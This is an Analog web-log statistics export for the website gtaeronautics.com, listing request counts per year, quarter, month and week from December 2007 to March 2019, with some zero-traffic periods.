x	VE	analog 5.24
x	HN	gtaeronautics.com
x	PS	2019	03	24	06	29
x	FR	2007	12	18	17	05
x	LR	2019	03	22	23	49
x	E7	2019	03	24	06	29
x	SR	761534
x	S7	1438
x	NC	318114
x	C7	0
x	FL	336527
x	F7	540
x	RR	179
x	R7	0
x	NH	69589
x	H7	347
x	BT	25024923595
x	B7	72095739
1	Rr	19255	2.528	2019
1	Rr	68927	9.051	2018
1	Rr	60168	7.901	2017
1	Rr	73316	9.627	2016
1	Rr	80796	10.610	2015
1	Rr	110773	14.546	2014
1	Rr	65173	8.558	2013
1	Rr	60742	7.976	2012
1	Rr	57015	7.487	2011
1	Rr	22139	2.907	2010
1	Rr	69710	9.154	2009
1	Rr	71820	9.431	2008
1	Rr	1700	0.223	2007
1	*BT	R	110773	2014
Q	Rr	19255	2.528	2019	1
Q	Rr	18129	2.381	2018	4
Q	Rr	17138	2.250	2018	3
Q	Rr	16928	2.223	2018	2
Q	Rr	16732	2.197	2018	1
Q	Rr	15937	2.093	2017	4
Q	Rr	0	0.000	2017	3
Q	Rr	16831	2.210	2017	2
Q	Rr	27400	3.598	2017	1
Q	Rr	22114	2.904	2016	4
Q	Rr	17621	2.314	2016	3
Q	Rr	15878	2.085	2016	2
Q	Rr	17703	2.325	2016	1
Q	Rr	16575	2.177	2015	4
Q	Rr	22104	2.903	2015	3
Q	Rr	22485	2.953	2015	2
Q	Rr	19632	2.578	2015	1
Q	Rr	21142	2.776	2014	4
Q	Rr	22272	2.925	2014	3
Q	Rr	31453	4.130	2014	2
Q	Rr	35906	4.715	2014	1
Q	Rr	16436	2.158	2013	4
Q	Rr	15216	1.998	2013	3
Q	Rr	16545	2.173	2013	2
Q	Rr	16976	2.229	2013	1
Q	Rr	16578	2.177	2012	4
Q	Rr	12511	1.643	2012	3
Q	Rr	15816	2.077	2012	2
Q	Rr	15837	2.080	2012	1
Q	Rr	15444	2.028	2011	4
Q	Rr	17386	2.283	2011	3
Q	Rr	9395	1.234	2011	2
Q	Rr	14790	1.942	2011	1
Q	Rr	1603	0.210	2010	4
Q	Rr	0	0.000	2010	3
Q	Rr	14047	1.845	2010	2
Q	Rr	6489	0.852	2010	1
Q	Rr	16350	2.147	2009	4
Q	Rr	18220	2.393	2009	3
Q	Rr	17115	2.247	2009	2
Q	Rr	18025	2.367	2009	1
Q	Rr	15905	2.089	2008	4
Q	Rr	15660	2.056	2008	3
Q	Rr	22448	2.948	2008	2
Q	Rr	17807	2.338	2008	1
Q	Rr	1700	0.223	2007	4
Q	*BT	R	35906	2014	1
m	Rr	4819	0.633	2019	03
m	Rr	6374	0.837	2019	02
m	Rr	8062	1.059	2019	01
m	Rr	6957	0.914	2018	12
m	Rr	5422	0.712	2018	11
m	Rr	5750	0.755	2018	10
m	Rr	5458	0.717	2018	09
m	Rr	5735	0.753	2018	08
m	Rr	5945	0.781	2018	07
m	Rr	7110	0.934	2018	06
m	Rr	6440	0.846	2018	05
m	Rr	3378	0.444	2018	04
m	Rr	5789	0.760	2018	03
m	Rr	5369	0.705	2018	02
m	Rr	5574	0.732	2018	01
m	Rr	3906	0.513	2017	12
m	Rr	6533	0.858	2017	11
m	Rr	5498	0.722	2017	10
m	Rr	0	0.000	2017	09
m	Rr	0	0.000	2017	08
m	Rr	0	0.000	2017	07
m	Rr	0	0.000	2017	06
m	Rr	6832	0.897	2017	05
m	Rr	9999	1.313	2017	04
m	Rr	11887	1.561	2017	03
m	Rr	7941	1.043	2017	02
m	Rr	7572	0.994	2017	01
m	Rr	9483	1.245	2016	12
m	Rr	7121	0.935	2016	11
m	Rr	5510	0.724	2016	10
m	Rr	6288	0.826	2016	09
m	Rr	5888	0.773	2016	08
m	Rr	5445	0.715	2016	07
m	Rr	5042	0.662	2016	06
m	Rr	5495	0.722	2016	05
m	Rr	5341	0.701	2016	04
m	Rr	5558	0.730	2016	03
m	Rr	5548	0.729	2016	02
m	Rr	6597	0.866	2016	01
m	Rr	5574	0.732	2015	12
m	Rr	5330	0.700	2015	11
m	Rr	5671	0.745	2015	10
m	Rr	6196	0.814	2015	09
m	Rr	6788	0.891	2015	08
m	Rr	9120	1.198	2015	07
m	Rr	7156	0.940	2015	06
m	Rr	5694	0.748	2015	05
m	Rr	9635	1.265	2015	04
m	Rr	6215	0.816	2015	03
m	Rr	6084	0.799	2015	02
m	Rr	7333	0.963	2015	01
m	Rr	6608	0.868	2014	12
m	Rr	6997	0.919	2014	11
m	Rr	7537	0.990	2014	10
m	Rr	7043	0.925	2014	09
m	Rr	7324	0.962	2014	08
m	Rr	7905	1.038	2014	07
m	Rr	11654	1.530	2014	06
m	Rr	9211	1.210	2014	05
m	Rr	10588	1.390	2014	04
m	Rr	7817	1.026	2014	03
m	Rr	15229	2.000	2014	02
m	Rr	12860	1.689	2014	01
m	Rr	5325	0.699	2013	12
m	Rr	5513	0.724	2013	11
m	Rr	5598	0.735	2013	10
m	Rr	4655	0.611	2013	09
m	Rr	4938	0.648	2013	08
m	Rr	5623	0.738	2013	07
m	Rr	5492	0.721	2013	06
m	Rr	5211	0.684	2013	05
m	Rr	5842	0.767	2013	04
m	Rr	6068	0.797	2013	03
m	Rr	5055	0.664	2013	02
m	Rr	5853	0.769	2013	01
m	Rr	5688	0.747	2012	12
m	Rr	5477	0.719	2012	11
m	Rr	5413	0.711	2012	10
m	Rr	4331	0.569	2012	09
m	Rr	3866	0.508	2012	08
m	Rr	4314	0.566	2012	07
m	Rr	4655	0.611	2012	06
m	Rr	6047	0.794	2012	05
m	Rr	5114	0.672	2012	04
m	Rr	6128	0.805	2012	03
m	Rr	5430	0.713	2012	02
m	Rr	4279	0.562	2012	01
m	Rr	5548	0.729	2011	12
m	Rr	4779	0.628	2011	11
m	Rr	5117	0.672	2011	10
m	Rr	5431	0.713	2011	09
m	Rr	6256	0.821	2011	08
m	Rr	5699	0.748	2011	07
m	Rr	5420	0.712	2011	06
m	Rr	3975	0.522	2011	05
m	Rr	0	0.000	2011	04
m	Rr	3608	0.474	2011	03
m	Rr	5171	0.679	2011	02
m	Rr	6011	0.789	2011	01
m	Rr	1603	0.210	2010	12
m	Rr	0	0.000	2010	11
m	Rr	0	0.000	2010	10
m	Rr	0	0.000	2010	09
m	Rr	0	0.000	2010	08
m	Rr	0	0.000	2010	07
m	Rr	4101	0.539	2010	06
m	Rr	5018	0.659	2010	05
m	Rr	4928	0.647	2010	04
m	Rr	5095	0.669	2010	03
m	Rr	1394	0.183	2010	02
m	Rr	0	0.000	2010	01
m	Rr	4665	0.613	2009	12
m	Rr	6187	0.812	2009	11
m	Rr	5498	0.722	2009	10
m	Rr	5066	0.665	2009	09
m	Rr	5718	0.751	2009	08
m	Rr	7436	0.976	2009	07
m	Rr	5685	0.747	2009	06
m	Rr	6120	0.804	2009	05
m	Rr	5310	0.697	2009	04
m	Rr	5515	0.724	2009	03
m	Rr	6123	0.804	2009	02
m	Rr	6387	0.839	2009	01
m	Rr	5763	0.757	2008	12
m	Rr	5420	0.712	2008	11
m	Rr	4722	0.620	2008	10
m	Rr	5435	0.714	2008	09
m	Rr	4843	0.636	2008	08
m	Rr	5382	0.707	2008	07
m	Rr	6082	0.799	2008	06
m	Rr	9946	1.306	2008	05
m	Rr	6420	0.843	2008	04
m	Rr	5431	0.713	2008	03
m	Rr	6469	0.849	2008	02
m	Rr	5907	0.776	2008	01
m	Rr	1700	0.223	2007	12
m	*BT	R	15229	2014	02
W	Rr	1464	0.192	2019	03	17
W	Rr	1381	0.181	2019	03	10
W	Rr	1627	0.214	2019	03	03
W	Rr	1773	0.233	2019	02	24
W	Rr	1669	0.219	2019	02	17
W	Rr	1483	0.195	2019	02	10
W	Rr	1391	0.183	2019	02	03
W	Rr	1797	0.236	2019	01	27
W	Rr	1963	0.258	2019	01	20
W	Rr	2029	0.266	2019	01	13
W	Rr	1696	0.223	2019	01	06
W	Rr	1526	0.200	2018	12	30
W	Rr	1226	0.161	2018	12	23
W	Rr	1442	0.189	2018	12	16
W	Rr	1936	0.254	2018	12	09
W	Rr	1809	0.238	2018	12	02
W	Rr	1295	0.170	2018	11	25
W	Rr	1820	0.239	2018	11	18
W	Rr	1802	0.237	2018	11	11
W	Rr	0	0.000	2018	11	04
W	Rr	1473	0.193	2018	10	28
W	Rr	1106	0.145	2018	10	21
W	Rr	1427	0.187	2018	10	14
W	Rr	1214	0.159	2018	10	07
W	Rr	1168	0.153	2018	09	30
W	Rr	1420	0.186	2018	09	23
W	Rr	1197	0.157	2018	09	16
W	Rr	1388	0.182	2018	09	09
W	Rr	1320	0.173	2018	09	02
W	Rr	1246	0.164	2018	08	26
W	Rr	1214	0.159	2018	08	19
W	Rr	1366	0.179	2018	08	12
W	Rr	1195	0.157	2018	08	05
W	Rr	1346	0.177	2018	07	29
W	Rr	1374	0.180	2018	07	22
W	Rr	1508	0.198	2018	07	15
W	Rr	1522	0.200	2018	07	08
W	Rr	909	0.119	2018	07	01
W	Rr	1444	0.190	2018	06	24
W	Rr	2682	0.352	2018	06	17
W	Rr	1365	0.179	2018	06	10
W	Rr	1329	0.175	2018	06	03
W	Rr	1275	0.167	2018	05	27
W	Rr	1392	0.183	2018	05	20
W	Rr	1321	0.173	2018	05	13
W	Rr	1527	0.201	2018	05	06
W	Rr	1517	0.199	2018	04	29
W	Rr	0	0.000	2018	04	22
W	Rr	1364	0.179	2018	04	15
W	Rr	1712	0.225	2018	04	08
W	Rr	0	0.000	2018	04	01
W	Rr	1543	0.203	2018	03	25
W	Rr	1342	0.176	2018	03	18
W	Rr	2429	0.319	2018	03	11
W	Rr	0	0.000	2018	03	04
W	Rr	1366	0.179	2018	02	25
W	Rr	1308	0.172	2018	02	18
W	Rr	1439	0.189	2018	02	11
W	Rr	1731	0.227	2018	02	04
W	Rr	0	0.000	2018	01	28
W	Rr	1434	0.188	2018	01	21
W	Rr	1578	0.207	2018	01	14
W	Rr	1471	0.193	2018	01	07
W	Rr	1246	0.164	2017	12	31
W	Rr	1033	0.136	2017	12	24
W	Rr	1103	0.145	2017	12	17
W	Rr	1406	0.185	2017	12	10
W	Rr	0	0.000	2017	12	03
W	Rr	1335	0.175	2017	11	26
W	Rr	1427	0.187	2017	11	19
W	Rr	1662	0.218	2017	11	12
W	Rr	1414	0.186	2017	11	05
W	Rr	1349	0.177	2017	10	29
W	Rr	1208	0.159	2017	10	22
W	Rr	2013	0.264	2017	10	15
W	Rr	1832	0.241	2017	10	08
W	Rr	0	0.000	2017	10	01
W	Rr	0	0.000	2017	09	24
W	Rr	0	0.000	2017	09	17
W	Rr	0	0.000	2017	09	10
W	Rr	0	0.000	2017	09	03
W	Rr	0	0.000	2017	08	27
W	Rr	0	0.000	2017	08	20
W	Rr	0	0.000	2017	08	13
W	Rr	0	0.000	2017	08	06
W	Rr	0	0.000	2017	07	30
W	Rr	0	0.000	2017	07	23
W	Rr	0	0.000	2017	07	16
